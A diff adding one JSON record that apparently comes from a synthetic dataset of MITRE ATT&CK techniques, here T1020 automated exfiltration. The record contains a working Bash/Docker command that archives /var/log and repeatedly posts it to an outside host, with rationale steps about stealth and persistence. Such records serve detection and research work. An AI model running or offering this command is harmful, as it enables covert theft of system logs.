@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_logs --network host -e HN=$(hostname) -v /var/log:/data:ro curlimages/curl:8.8.0 sh -c 'while true; do TS=$(date +%s); tar -C /data -cz . | curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- \"http://203.0.113.15:8080/upload?host=$HN&type=logs&ts=$TS\"; sleep 1800; done'",
+  "explanation": "Runs a detached container that periodically archives host logs and quietly posts them over HTTP, automating exfiltration.",
+  "rationale_steps": [
+    "Leverages docker_group privileges to mount /var/log read-only into the container",
+    "Uses a while loop to automate periodic data collection",
+    "Tars and compresses logs, sending via curl with silent flags to minimize noise",
+    "Runs detached to stay unobtrusive and persistent"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-287a3a6e",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
